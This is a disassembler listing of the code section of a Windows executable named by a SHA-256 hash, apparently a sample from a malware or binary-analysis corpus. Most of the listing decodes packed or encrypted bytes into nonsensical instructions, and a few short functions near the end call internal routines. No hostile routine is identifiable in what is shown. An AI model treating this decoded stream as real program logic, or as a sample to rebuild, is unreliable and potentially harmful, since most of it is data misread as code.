
adde087b663e3aae7325c1ceafd6f57dc152e26d392e32e4606ac7b5974cdf28.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	xor    ebx,DWORD PTR [esp+ecx*4-0x3d]
  4d0004:	aam    0xc2
  4d0006:	imul   eax,DWORD PTR [edx+0x63],0x56
  4d000a:	sub    eax,0xc9d037f1
  4d000f:	repnz outs dx,DWORD PTR ds:[esi]
  4d0011:	push   es
  4d0012:	(bad)  
  4d0014:	or     al,0x64
  4d0016:	enter  0x4511,0xf4
  4d001a:	(bad)  
  4d001b:	jle    0x4d0004
  4d001d:	aam    0xbb
  4d001f:	inc    edx
  4d0020:	sbb    eax,0xe19fa280
  4d0025:	add    esp,DWORD PTR [edx]
  4d0027:	push   ebp
  4d0028:	or     BYTE PTR [edx],cl
  4d002a:	fisubr WORD PTR [edx+0x665c75f9]
  4d0030:	icebp  
  4d0031:	out    dx,eax
  4d0032:	bswap  ebp
  4d0034:	inc    edx
  4d0035:	ds push esp
  4d0037:	lahf   
  4d0038:	sub    eax,edx
  4d003a:	add    esi,DWORD PTR [ecx+0x79c73e57]
  4d0040:	or     eax,DWORD PTR [edi+0x38]
  4d0043:	pop    ebp
  4d0044:	adc    DWORD PTR [ecx-0x10431a35],0x90456aac
  4d004e:	push   edi
  4d004f:	xchg   ebp,eax
  4d0050:	xor    bl,BYTE PTR [ebx+0x64d45d90]
  4d0056:	outs   dx,DWORD PTR ds:[esi]
  4d0057:	(bad)  
  4d0058:	mov    eax,0x49114a90
  4d005d:	outs   dx,DWORD PTR ds:[esi]
  4d005e:	mov    ch,0x9b
  4d0060:	mov    al,ds:0x61644d83
  4d0065:	add    eax,0xf08297f9
  4d006a:	jno    0x4d0037
  4d006c:	out    0x50,eax
  4d006e:	cli    
  4d006f:	mov    al,ds:0xc44e1789
  4d0074:	fstp   DWORD PTR [eax+0x6]
  4d0077:	(bad)  
  4d0078:	daa    
  4d0079:	std    
  4d007a:	add    edx,edi
  4d007c:	loopne 0x4d00ea
  4d007e:	(bad)  
  4d007f:	ins    DWORD PTR es:[edi],dx
  4d0080:	addr16 add eax,0x4302f767
  4d0086:	(bad)  
  4d0087:	imul   ebp,DWORD PTR [edi+0x11],0xf6e79555
  4d008e:	xor    esi,DWORD PTR [ecx+0x67908c1e]
  4d0094:	dec    ebp
  4d0095:	mov    ah,0xd7
  4d0097:	cwde   
  4d0098:	les    ecx,FWORD PTR [ebx+0x28]
  4d009b:	iret   
  4d009c:	loope  0x4d0058
  4d009e:	xlat   BYTE PTR ds:[ebx]
  4d009f:	xor    BYTE PTR [edx-0x78dad8bb],cl
  4d00a5:	inc    ebp
  4d00a6:	shl    eax,1
  4d00a8:	sbb    DWORD PTR [ebx-0x2dc7e0d2],edi
  4d00ae:	xchg   BYTE PTR [ecx+0x8792dc2],dh
  4d00b4:	jecxz  0x4d008e
  4d00b6:	xchg   bh,dh
  4d00b8:	adc    esp,ecx
  4d00ba:	cmp    al,0xf1
  4d00bc:	jns    0x4d00f7
  4d00be:	ret    
  4d00bf:	push   cs
  4d00c0:	in     eax,0x24
  4d00c2:	les    esp,FWORD PTR ds:0xd4243140
  4d00c8:	(bad)
  4d00cb:	adc    esi,DWORD PTR [ebx+0x36]
  4d00ce:	and    al,0xec
  4d00d0:	sbb    edx,eax
  4d00d2:	inc    esi
  4d00d3:	adc    al,0x52
  4d00d5:	ds mov eax,0x47191361
  4d00db:	hlt    
  4d00dc:	push   ss
  4d00dd:	jb     0x4d00e5
  4d00df:	je     0x4d0136
  4d00e1:	mov    cs,WORD PTR [ebp-0x1c]
  4d00e4:	stos   DWORD PTR es:[edi],eax
  4d00e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d00e6:	(bad)  
  4d00e7:	imul   esp,DWORD PTR [edi-0x506c7f51],0x7c
  4d00ee:	xlat   BYTE PTR ds:[ebx]
  4d00ef:	ret    
  4d00f0:	push   ecx
  4d00f1:	fld    DWORD PTR [eax+0x24]
  4d00f4:	fldcw  WORD PTR [ecx]
  4d00f6:	mov    edi,0x7d1cb3db
  4d00fb:	mov    cl,0x52
  4d00fd:	jmp    0x2d3c46ea
  4d0102:	pop    ss
  4d0103:	fiadd  DWORD PTR [edi-0x5181de17]
  4d0109:	mov    ch,bh
  4d010b:	or     al,0xab
  4d010d:	test   eax,0x56bef77a
  4d0112:	mov    ch,0x8
  4d0114:	inc    ebx
  4d0115:	test   al,0xbb
  4d0117:	inc    edi
  4d0118:	adc    DWORD PTR [edi-0x66],edx
  4d011b:	enter  0x267b,0xd2
  4d011f:	xchg   edx,ebx
  4d0121:	inc    ebx
  4d0122:	xor    cl,bh
  4d0124:	jp     0x4d00e1
  4d0126:	and    edi,DWORD PTR ds:0x19deaedb
  4d012c:	jns    0x4d00d5
  4d012e:	lods   al,BYTE PTR ds:[esi]
  4d012f:	mov    ch,0x13
  4d0131:	push   esp
  4d0132:	inc    edi
  4d0133:	out    dx,eax
  4d0134:	dec    esp
  4d0135:	stos   DWORD PTR es:[edi],eax
  4d0136:	push   cs
  4d0137:	sbb    eax,0xe6bfe00d
  4d013c:	cmp    eax,0xdc92cd5c
  4d0141:	mov    cl,BYTE PTR cs:[ebp-0x794877cc]
  4d0148:	shr    BYTE PTR [edi+0x58],1
  4d014b:	xor    BYTE PTR [edx-0x6a],bh
  4d014e:	pop    es
  4d014f:	pop    ebx
  4d0150:	into   
  4d0151:	jge    0x4d01d0
  4d0153:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4d0155:	ret    
  4d0156:	or     eax,0xb2c162e2
  4d015b:	xchg   edx,eax
  4d015c:	fldenv [esi]
  4d015e:	fbstp  TBYTE PTR [ecx+0x28]
  4d0161:	fldcw  WORD PTR [ebx+0x786e6456]
  4d0167:	xchg   ecx,eax
  4d0168:	adc    dl,BYTE PTR [edi+eax*4-0x731d0d92]
  4d016f:	nop
  4d0170:	xchg   BYTE PTR ds:0xd587eefe,ch
  4d0176:	cld    
  4d0177:	ins    BYTE PTR es:[edi],dx
  4d0178:	retf   0xd7b5
  4d017b:	in     eax,0x87
  4d017d:	fwait
  4d017e:	jg     0x4d01eb
  4d0180:	int3   
  4d0181:	into   
  4d0182:	test   ch,ah
  4d0184:	mov    WORD PTR [eax],?
  4d0186:	shl    DWORD PTR [esi],1
  4d0188:	into   
  4d0189:	add    ch,bh
  4d018b:	xor    BYTE PTR [esi],ah
  4d018d:	test   al,0x70
  4d018f:	pop    edx
  4d0190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0191:	dec    ebx
  4d0192:	xor    al,0xa5
  4d0194:	mov    al,0xc0
  4d0196:	and    edi,DWORD PTR [esp+edx*8-0x21d9fafa]
  4d019d:	loope  0x4d01a5
  4d019f:	(bad)  [ebx]
  4d01a1:	push   ds
  4d01a2:	loope  0x4d014a
  4d01a4:	fsubrp st(1),st
  4d01a6:	push   ds
  4d01a7:	mov    cl,0x8b
  4d01a9:	push   ds
  4d01aa:	and    DWORD PTR [edi+0x76],ecx
  4d01ad:	loopne 0x4d0203
  4d01af:	sbb    ecx,esp
  4d01b1:	stos   BYTE PTR es:[edi],al
  4d01b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d01b3:	jb     0x4d01c5
  4d01b5:	ds fs xchg ecx,eax
  4d01b8:	icebp  
  4d01b9:	sar    edi,0x6d
  4d01bc:	inc    ebp
  4d01bd:	outs   dx,BYTE PTR ds:[esi]
  4d01be:	add    BYTE PTR [edx-0x51751644],dl
  4d01c4:	push   ecx
  4d01c5:	mov    eax,ds:0xb6e95db5
  4d01ca:	bound  edx,QWORD PTR [esi]
  4d01cc:	sbb    al,0xd4
  4d01ce:	popf   
  4d01cf:	aam    0xdc
  4d01d1:	mov    bh,0x6e
  4d01d3:	dec    edi
  4d01d4:	sub    BYTE PTR [ecx-0x68b5c433],dl
  4d01da:	xor    eax,0xe2e140bb
  4d01df:	int    0x31
  4d01e1:	cmp    eax,DWORD PTR [ebx+0x7cdb1129]
  4d01e7:	mul    BYTE PTR [ebp+0x31]
  4d01ea:	out    0xaa,eax
  4d01ec:	mov    ah,0xce
  4d01ee:	sbb    BYTE PTR [ebp-0x28],dl
  4d01f1:	jno    0x4d020a
  4d01f3:	xor    al,0xa1
  4d01f5:	xchg   esi,eax
  4d01f6:	out    0x21,eax
  4d01f8:	je     0x4d024b
  4d01fa:	(bad)  
  4d01fb:	loopne 0x4d018a
  4d01fd:	scas   al,BYTE PTR es:[edi]
  4d01fe:	int    0xe8
  4d0200:	int3   
  4d0201:	fisub  DWORD PTR [esi-0x5679aec5]
  4d0207:	lods   al,BYTE PTR ds:[esi]
  4d0208:	in     eax,dx
  4d0209:	jge    0x4d0261
  4d020b:	push   ebx
  4d020c:	ins    BYTE PTR es:[edi],dx
  4d020d:	add    esp,DWORD PTR [edx]
  4d020f:	add    eax,0xfaddfe95
  4d0214:	loope  0x4d0226
  4d0216:	lods   eax,DWORD PTR ds:[esi]
  4d0217:	or     DWORD PTR [esi+esi*4+0x57],eax
  4d021b:	sbb    bh,BYTE PTR [ebp+0x43e5a849]
  4d0221:	sub    edi,DWORD PTR [esi+ebx*1+0xe]
  4d0225:	or     BYTE PTR [ebp+eiz*4+0x53],al
  4d0229:	sub    DWORD PTR [edi-0x2446dba2],0x57
  4d0230:	pop    ebp
  4d0231:	inc    edi
  4d0232:	and    al,0xa8
  4d0234:	sub    DWORD PTR [edi+0x43dbcb50],ebp
  4d023a:	cmp    esi,DWORD PTR [ebx-0x3e3bbece]
  4d0240:	cmp    edx,eax
  4d0242:	ss xchg esi,eax
  4d0244:	(bad)  
  4d0245:	xchg   ebx,eax
  4d0246:	int    0xee
  4d0248:	cli    
  4d0249:	loope  0x4d0281
  4d024b:	push   0xe7c97406
  4d0250:	push   ecx
  4d0251:	pop    ss
  4d0252:	lods   eax,DWORD PTR ds:[esi]
  4d0253:	sub    BYTE PTR [ebx-0x42a2125],dh
  4d0259:	test   eax,0x82019fe1
  4d025e:	adc    eax,0x3bdcceec
  4d0263:	xchg   DWORD PTR fs:[ebp+0x71d1ecc8],ecx
  4d026a:	lea    ebx,[edi]
  4d026c:	xchg   BYTE PTR [ecx],bl
  4d026e:	jns    0x4d02d5
  4d0270:	cmp    esi,DWORD PTR [edi+0x17]
  4d0273:	es or  al,0x99
  4d0276:	jne    0x4d0286
  4d0278:	clc    
  4d0279:	mov    ebp,0xb6c97737
  4d027e:	jecxz  0x4d02b1
  4d0280:	cmp    BYTE PTR [ecx+0x1c],cl
  4d0283:	dec    esi
  4d0284:	ds mov ebx,0x46c6f670
  4d028a:	mov    ah,0x8
  4d028c:	cmp    bh,BYTE PTR [ecx-0x4439b835]
  4d0292:	pop    eax
  4d0293:	int3   
  4d0294:	cmp    bl,BYTE PTR [edx+0x46b2deaf]
  4d029a:	mov    al,0x7f
  4d029c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d029d:	adc    ah,BYTE PTR [eax+edx*8-0x7aa4bb55]
  4d02a4:	bound  edx,QWORD PTR [ebx]
  4d02a6:	sub    BYTE PTR [ecx-0x4d],al
  4d02a9:	xlat   BYTE PTR ds:[ebx]
  4d02aa:	and    BYTE PTR [bx+di],dl
  4d02ad:	mov    DWORD PTR [ebx],esp
  4d02af:	mov    bl,0x7b
  4d02b1:	imul   esp,eax,0x75c1c2c2
  4d02b7:	jno    0x4d027d
  4d02b9:	adc    BYTE PTR [edx+0x65efd212],bl
  4d02bf:	in     eax,dx
  4d02c0:	mov    edx,0x47133e9e
  4d02c5:	popa   
  4d02c6:	dec    esp
  4d02c7:	mov    ds:0x5cb39f5a,eax
  4d02cc:	sub    al,0x57
  4d02ce:	pop    esp
  4d02cf:	daa    
  4d02d0:	push   esi
  4d02d1:	test   eax,0x49aed8a3
  4d02d6:	or     dh,BYTE PTR [ebx-0x620f45b5]
  4d02dc:	inc    ecx
  4d02dd:	or     ah,BYTE PTR [eax-0x4d]
  4d02e0:	adc    al,BYTE PTR [esi+0xa]
  4d02e3:	push   ecx
  4d02e4:	push   edi
  4d02e5:	mov    edx,0x9caaaf05
  4d02ea:	jge    0x4d0325
  4d02ec:	pop    ebx
  4d02ed:	mov    bl,0xec
  4d02ef:	retf   0x4d0e
  4d02f2:	and    esi,DWORD PTR ds:0xcf5e09f3
  4d02f8:	xor    dh,dh
  4d02fa:	mov    cl,0x30
  4d02fc:	iret   
  4d02fd:	or     BYTE PTR [ebx+ebx*8+0x7e684d31],ah
  4d0304:	sub    DWORD PTR [eax-0x3d],esp
  4d0307:	dec    ecx
  4d0308:	sub    DWORD PTR [ebx],ebp
  4d030a:	add    eax,0xe458c188
  4d030f:	jl     0x4d0384
  4d0311:	xor    BYTE PTR [bx+si],0xf4
  4d0315:	inc    ecx
  4d0316:	jle    0x4d0317
  4d0318:	add    esi,0x398fffa6
  4d031e:	pop    ecx
  4d031f:	add    DWORD PTR [esi-0x2b127733],eax
  4d0325:	mov    edi,0x913136bb
  4d032a:	xchg   esi,eax
  4d032b:	sbb    edi,ecx
  4d032d:	lahf   
  4d032e:	shl    esi,1
  4d0330:	inc    edx
  4d0331:	pusha  
  4d0332:	cs jo  0x4d0377
  4d0335:	mov    dh,dl
  4d0337:	fistp  QWORD PTR [esi+0x532091a8]
  4d033d:	push   edi
  4d033e:	outs   dx,BYTE PTR ds:[esi]
  4d033f:	ss das 
  4d0341:	lods   eax,DWORD PTR ds:[esi]
  4d0342:	mov    ch,0xc9
  4d0344:	loop   0x4d0398
  4d0346:	dec    edx
  4d0347:	xor    eax,0x20b4b974
  4d034c:	cdq    
  4d034d:	mov    al,ds:0xe4c037a4
  4d0352:	and    al,0x3e
  4d0354:	ret    0x9e7c
  4d0357:	and    ch,BYTE PTR [edx]
  4d0359:	mov    ecx,DWORD PTR [esi]
  4d035b:	rcl    ah,0x2
  4d035e:	es inc ebx
  4d0360:	lock mov dl,al
  4d0363:	dec    eax
  4d0364:	add    al,0x31
  4d0366:	dec    esi
  4d0367:	mov    bh,0xfd
  4d0369:	into   
  4d036a:	cdq    
  4d036b:	xor    al,0x3
  4d036d:	xor    DWORD PTR [esi-0x7b],esp
  4d0370:	sbb    eax,0xcc7a99cf
  4d0375:	adc    ah,BYTE PTR [esi-0x7b]
  4d0378:	xor    al,0x44
  4d037a:	push   ebx
  4d037b:	or     ch,0xbb
  4d037e:	lods   al,BYTE PTR ds:[esi]
  4d037f:	or     al,BYTE PTR gs:[ebx+edx*2-0x66]
  4d0384:	or     BYTE PTR [eax+edi*1-0x2ed35c66],0x65
  4d038c:	pop    esi
  4d038d:	rcl    DWORD PTR [esi],cl
  4d038f:	bound  esp,QWORD PTR [edx+0x5d29e92c]
  4d0395:	pop    edi
  4d0396:	loope  0x4d0356
  4d0398:	bound  esp,QWORD PTR [eax+0x1fd2411e]
  4d039e:	xor    al,BYTE PTR [eax-0x7b711809]
  4d03a4:	cs and eax,0x86f77f72
  4d03aa:	adc    al,BYTE PTR [ecx+0x7f]
  4d03ad:	push   0x46
  4d03af:	dec    edx
  4d03b0:	jns    0x4d0383
  4d03b2:	jle    0x4d03de
  4d03b4:	mov    edi,DWORD PTR [eax-0xa]
  4d03b7:	mov    dl,0x1
  4d03b9:	mov    esp,0x440a062d
  4d03be:	sar    cl,cl
  4d03c0:	fist   WORD PTR [ecx+0x2d]
  4d03c3:	push   es
  4d03c4:	and    DWORD PTR [esi-0x5fc9f977],edi
  4d03ca:	(bad)  
  4d03cb:	mov    dl,0xd3
  4d03cd:	pop    edi
  4d03ce:	cmp    BYTE PTR [ebp+0x16],cl
  4d03d1:	es (bad) 
  4d03d3:	mov    dl,0xea
  4d03d5:	xor    esp,DWORD PTR [ecx]
  4d03d7:	int    0x16
  4d03d9:	int3   
  4d03da:	fidivr WORD PTR [edi+ebx*2+0x65a43d58]
  4d03e1:	stc    
  4d03e2:	add    DWORD PTR [ecx+edi*4-0x41],0xffffff9c
  4d03e7:	mov    ebx,0xb8ab4048
  4d03ec:	jmp    0x18945b69
  4d03f1:	xchg   eax,esi
  4d03f3:	sub    al,0x11
  4d03f5:	xor    dh,BYTE PTR [eax]
  4d03f7:	shl    eax,cl
  4d03f9:	int    0x17
  4d03fb:	mov    eax,ds:0x5eeceb31
  4d0400:	rcl    BYTE PTR [ebx+ebx*2],1
  4d0403:	adc    eax,0xeae5a449
  4d0408:	mov    eax,0x5989625b
  4d040d:	pop    ebp
  4d040e:	mov    ds:0xa5a2a876,al
  4d0413:	std    
  4d0414:	popa   
  4d0415:	push   ss
  4d0416:	fwait
  4d0417:	add    ah,BYTE PTR [eax+0x6171ace9]
  4d041d:	mov    eax,ds:0xbf63e814
  4d0422:	jbe    0x4d0491
  4d0424:	push   cs
  4d0425:	ret    0x247b
  4d0428:	fld    QWORD PTR [ebx-0x1b8e9904]
  4d042e:	mov    ss,WORD PTR [edi+0x68c99913]
  4d0434:	bound  ebp,QWORD PTR [edx+0x37]
  4d0437:	or     al,0xf7
  4d0439:	and    BYTE PTR [esi],cl
  4d043b:	push   esp
  4d043c:	(bad)  
  4d043d:	lahf   
  4d043e:	sar    bx,0xa6
  4d0442:	aad    0x90
  4d0444:	rcr    BYTE PTR [ebp+0x2a],0x6f
  4d0448:	inc    ecx
  4d0449:	mov    bh,BYTE PTR [ebx-0x6e]
  4d044c:	shl    BYTE PTR [ebp-0x22],0x70
  4d0450:	xor    DWORD PTR [esi-0x526744e7],ecx
  4d0456:	pop    ebx
  4d0457:	popf   
  4d0458:	ficomp WORD PTR [edi-0x59]
  4d045b:	xlat   BYTE PTR ds:[ebx]
  4d045c:	jg     0x4d0401
  4d045e:	aad    0x84
  4d0460:	lods   eax,DWORD PTR ds:[esi]
  4d0461:	test   eax,0xcb1d0086
  4d0466:	test   BYTE PTR [esp+esi*1+0x78ae3d68],ch
  4d046d:	sbb    ebp,DWORD PTR [ebp+edx*2+0x6db5c86b]
  4d0474:	idiv   BYTE PTR [edx-0x46f42139]
  4d047a:	dec    edx
  4d047b:	or     DWORD PTR ds:0x87f6b547,eax
  4d0481:	ss lahf 
  4d0483:	mov    ?,WORD PTR [ecx+0x3e]
  4d0486:	addr16 sbb al,0x70
  4d0489:	gs cdq 
  4d048b:	jecxz  0x4d041e
  4d048d:	sti    
  4d048e:	sub    DWORD PTR [ebp+0x6f],edi
  4d0491:	pop    edx
  4d0492:	adc    cl,BYTE PTR [esi]
  4d0494:	push   0x31
  4d0496:	arpl   WORD PTR [esi],di
  4d0498:	and    dl,BYTE PTR [ebp*8+0x13542f11]
  4d049f:	out    dx,al
  4d04a0:	fisubr WORD PTR [ebx-0x6b87eec1]
  4d04a6:	sbb    DWORD PTR [edi],edi
  4d04a8:	adc    al,0x64
  4d04aa:	fisub  DWORD PTR [ebp-0x2b]
  4d04ad:	aam    0x25
  4d04af:	call   0xacf9:0xaa63732c
  4d04b6:	daa    
  4d04b7:	dec    esi
  4d04b8:	xchg   ebp,eax
  4d04b9:	pop    edi
  4d04ba:	xchg   ebp,eax
  4d04bb:	mov    dh,0x6c
  4d04bd:	mov    al,ds:0x7836ad6a
  4d04c2:	xchg   ebp,eax
  4d04c3:	push   edx
  4d04c4:	retf   
  4d04c5:	adc    bl,bl
  4d04c7:	fld    DWORD PTR [edi-0x79d9daab]
  4d04cd:	stos   BYTE PTR es:[edi],al
  4d04ce:	sub    eax,0x5f95d0d9
  4d04d3:	xor    ebp,ecx
  4d04d5:	stc    
  4d04d6:	mov    eax,ds:0xe9d5a31c
  4d04db:	fist   DWORD PTR [ecx-0x30]
  4d04de:	jp     0x4d04a5
  4d04e0:	enter  0x852f,0x3a
  4d04e4:	enter  0xa710,0x26
  4d04e8:	cld    
  4d04e9:	dec    edi
  4d04ea:	fcmovb st,st(5)
  4d04ec:	and    eax,0x443a25b2
  4d04f1:	jb     0x4d04cf
  4d04f3:	lds    edi,FWORD PTR [ebp+0x44a519c0]
  4d04f9:	test   eax,0x731259ee
  4d04fe:	pushf  
  4d04ff:	jle    0x4d0544
  4d0501:	loopne 0x4d0565
  4d0503:	xlat   BYTE PTR ds:[ebx]
  4d0504:	repnz stos BYTE PTR es:[edi],al
  4d0506:	loope  0x4d0554
  4d0508:	sub    ebx,DWORD PTR [eax+0x5e]
  4d050b:	out    dx,eax
  4d050c:	popa   
  4d050d:	sub    BYTE PTR [edx+0x11],ah
  4d0510:	mov    al,ds:0xd5af22d7
  4d0515:	sub    DWORD PTR [ebx],esp
  4d0517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0518:	jg     0x4d04ef
  4d051a:	xor    dl,BYTE PTR [ebx+0x5242eb07]
  4d0520:	dec    ebp
  4d0521:	adc    al,0x13
  4d0523:	(bad)  
  4d0524:	xor    eax,0xcc3c11b0
  4d0529:	dec    edi
  4d052a:	ja     0x4d0564
  4d052c:	pop    ecx
  4d052d:	int3   
  4d052e:	jmp    0x82e90dbd
  4d0533:	loope  0x4d052e
  4d0535:	arpl   bp,sp
  4d0537:	nop
  4d0538:	jl     0x4d0504
  4d053a:	jle    0x4d0513
  4d053c:	repnz test al,0xf7
  4d053f:	mov    esp,DWORD PTR [ebx+0x56]
  4d0542:	pop    esi
  4d0543:	js     0x4d0568
  4d0545:	push   0x17
  4d0547:	nop
  4d0548:	xor    dl,BYTE PTR [ebp+0x2b54703e]
  4d054e:	fst    QWORD PTR ss:[edi]
  4d0551:	aad    0x31
  4d0553:	mov    WORD PTR [eax-0x61],ds
  4d0556:	xor    al,0xdc
  4d0558:	psubusb mm7,QWORD PTR [ebx]
  4d055b:	xchg   esi,eax
  4d055c:	inc    esi
  4d055d:	js     0x4d0522
  4d055f:	mov    edi,0x4d010ac3
  4d0564:	leave  
  4d0565:	in     eax,0x4f
  4d0567:	pop    es
  4d0568:	mov    ds:0xb5001a5a,al
  4d056d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d056e:	cmp    ecx,DWORD PTR [esp+eiz*4]
  4d0571:	stos   DWORD PTR es:[edi],eax
  4d0572:	sbb    BYTE PTR [edi+eax*8+0x5b],al
  4d0576:	cmp    eax,0xc2a460a4
  4d057b:	pop    ebx
  4d057c:	sub    al,0x98
  4d057e:	popa   
  4d057f:	and    eax,0xda9e7a9c
  4d0584:	gs out dx,eax
  4d0586:	push   0xdeb58f7e
  4d058b:	or     al,0x38
  4d058d:	imul   BYTE PTR [esi-0x46453d8f]
  4d0593:	cmp    BYTE PTR [edi+0x148af6f0],dl
  4d0599:	maxps  xmm0,XMMWORD PTR [ecx-0x749a8bbb]
  4d05a0:	sbb    eax,0xb473f34f
  4d05a5:	push   es
  4d05a6:	cmc    
  4d05a7:	sub    cl,BYTE PTR [ebp-0x7]
  4d05aa:	or     dh,BYTE PTR [edx]
  4d05ac:	inc    ecx
  4d05ad:	dec    esp
  4d05ae:	gs push ecx
  4d05b0:	cmp    BYTE PTR [eax+0x57a5f323],0x39
  4d05b7:	or     eax,0xf2c6a85c
  4d05bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d05bd:	push   edi
  4d05be:	mov    eax,ds:0x5ea85c0d
  4d05c3:	mov    ch,0xb
  4d05c5:	mov    edx,DWORD PTR [edi-0x3d3d4f4f]
  4d05cb:	mov    ah,0xfe
  4d05cd:	mov    ds:0x64771b70,eax
  4d05d2:	adc    bl,dl
  4d05d4:	mov    WORD PTR [ebx+0x42602cef],gs
  4d05da:	sahf   
  4d05db:	xor    DWORD PTR [edi+0x53446142],ebx
  4d05e1:	dec    ecx
  4d05e2:	adc    eax,0x3b7114f6
  4d05e7:	dec    edi
  4d05e8:	jp     0x4d05ad
  4d05ea:	loop   0x4d0602
  4d05ec:	xor    al,0xa3
  4d05ee:	push   eax
  4d05ef:	mov    ecx,0x98733d42
  4d05f4:	repnz mov ecx,esi
  4d05f7:	xchg   edx,eax
  4d05f8:	shr    esp,1
  4d05fa:	xor    eax,0xc1fe32e1
  4d05ff:	push   edx
  4d0600:	pop    DWORD PTR ds:0x546e9000
  4d0606:	ret    
  4d0607:	sti    
  4d0608:	adc    BYTE PTR [edi+eiz*4],dl
  4d060b:	or     BYTE PTR [ecx-0x14],bl
  4d060e:	push   0x16aa8f7
  4d0613:	or     DWORD PTR [eax-0x15],ebx
  4d0616:	push   cs
  4d0617:	sbb    BYTE PTR [ecx+0x6982dd96],0x69
  4d061e:	and    cl,BYTE PTR [eax]
  4d0620:	xchg   esp,eax
  4d0621:	jmp    ecx
  4d0623:	clc    
  4d0624:	ins    DWORD PTR es:[edi],dx
  4d0625:	add    BYTE PTR [ebp+0x5a],dh
  4d0628:	xchg   ebx,eax
  4d0629:	push   ebp
  4d062a:	stos   DWORD PTR es:[edi],eax
  4d062b:	movd   mm2,DWORD PTR [edx]
  4d062e:	aad    0xf0
  4d0630:	xchg   ebx,eax
  4d0631:	in     eax,dx
  4d0632:	xchg   esp,eax
  4d0633:	adc    bl,al
  4d0635:	adc    dl,ch
  4d0637:	out    dx,al
  4d0638:	xchg   ecx,eax
  4d0639:	in     eax,dx
  4d063a:	sub    dl,BYTE PTR [ecx]
  4d063c:	lock imul edx,esp,0xf0173544
  4d0643:	mov    edi,0x30fe8cd
  4d0648:	les    ebp,FWORD PTR [edi-0x11]
  4d064b:	int    0x38
  4d064d:	gs mov bl,0x93
  4d0650:	push   ebx
  4d0651:	xlat   BYTE PTR ds:[ebx]
  4d0652:	push   eax
  4d0653:	mov    ecx,0x135ee0fb
  4d0658:	jecxz  0x4d06b4
  4d065a:	cmp    dh,BYTE PTR [ebx+0x3e]
  4d065d:	xor    DWORD PTR [esi],ecx
  4d065f:	out    dx,eax
  4d0660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0661:	inc    ecx
  4d0662:	retf   
  4d0663:	sub    al,0x3d
  4d0665:	jnp    0x4d067a
  4d0667:	inc    eax
  4d0668:	pop    edi
  4d0669:	xor    ecx,DWORD PTR [ecx-0x400f9d6c]
  4d066f:	pop    es
  4d0670:	ja     0x4d06ef
  4d0672:	in     eax,dx
  4d0673:	js     0xbfc2c3c5
  4d0679:	pop    ds
  4d067a:	fnsave [ebx-0xcd19cb6]
  4d0680:	jo     0x4d0605
  4d0682:	call   0x18e5d794
  4d0687:	jge    0x4d0674
  4d0689:	scas   eax,DWORD PTR es:[edi]
  4d068a:	leave  
  4d068b:	dec    edx
  4d068c:	mov    ds:0x60db930f,eax
  4d0691:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d0699:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a1:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a9:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06b1:	in     al,0xac
  4d06b3:	(bad)  [ecx+0x60245873]
  4d06b9:	nop
  4d06ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d06bb:	(bad)  [ebp-0x72]
  4d06be:	fisubr DWORD PTR [edx]
  4d06c0:	mov    ds:0x7d08d4d3,al
  4d06c5:	dec    eax
  4d06c6:	into   
  4d06c7:	aad    0x9b
  4d06c9:	sbb    ecx,DWORD PTR [edi-0x518eb034]
  4d06cf:	mov    ?,eax
  4d06d1:	mov    dl,0xe1
  4d06d3:	int3   
  4d06d4:	xor    DWORD PTR [edi-0x2577668c],0x4e
  4d06db:	(bad)  
  4d06dc:	xor    cl,BYTE PTR [edx]
  4d06de:	fmul   DWORD PTR ds:0xbc42ba1f
  4d06e4:	mul    BYTE PTR ds:[esi+edi*4-0x6]
  4d06e9:	jo     0x4d06ca
  4d06eb:	into   
  4d06ec:	mov    edi,edi
  4d06ee:	push   ebp
  4d06ef:	mov    ebp,esp
  4d06f1:	sub    esp,0x50
  4d06f4:	mov    edi,0x4d30b4
  4d06f9:	add    edx,DWORD PTR [edi-0x54]
  4d06fc:	push   edi
  4d06fd:	mov    eax,0x0
  4d0702:	push   eax
  4d0703:	call   0x4d08c8
  4d0708:	add    esp,0x4
  4d070b:	pop    edi
  4d070c:	push   edi
  4d070d:	push   ecx
  4d070e:	push   esi
  4d070f:	push   esi
  4d0710:	call   0x4d0a08
  4d0715:	add    esp,0xc
  4d0718:	pop    edi
  4d0719:	push   edi
  4d071a:	mov    edi,0x0
  4d071f:	push   edi
  4d0720:	call   0x4d12e8
  4d0725:	add    esp,0x4
  4d0728:	pop    edi
  4d0729:	add    esp,0x50
  4d072c:	pop    ebp
  4d072d:	ret    
  4d072e:	add    BYTE PTR [eax],al
  4d0730:	mov    edi,edi
  4d0732:	push   ebp
  4d0733:	mov    ebp,esp
  4d0735:	sub    esp,0x30
  4d0738:	lea    esi,ds:0x4d31e4
  4d073e:	or     edi,0xffffffe4
  4d0741:	push   esi
  4d0742:	push   edx
  4d0743:	push   ebx
  4d0744:	push   ecx
  4d0745:	call   0x4d11f0
  4d074a:	add    esp,0xc
  4d074d:	pop    esi
  4d074e:	mov    ebx,0x0
  4d0753:	push   ebx
  4d0754:	call   0x4d0e14
  4d0759:	add    esp,0x4
  4d075c:	call   0x4d0c68
  4d0761:	add    esp,0x4
  4d0764:	add    esp,0x30
  4d0767:	pop    ebp
  4d0768:	ret    
  4d0769:	add    BYTE PTR [eax],al
  4d076b:	add    BYTE PTR [edi-0x1],bl
  4d076e:	adc    eax,0x4d209c
  4d0773:	call   edi
  4d0775:	add    BYTE PTR [eax],al
  4d0777:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d077d:	sub    esp,0x44
  4d0780:	lea    edi,[ebx+0x24]
  4d0783:	xor    edx,0xffffffc6
  4d0786:	push   edi
  4d0787:	mov    edx,0x0
  4d078c:	push   edx
  4d078d:	call   0x4d0a90
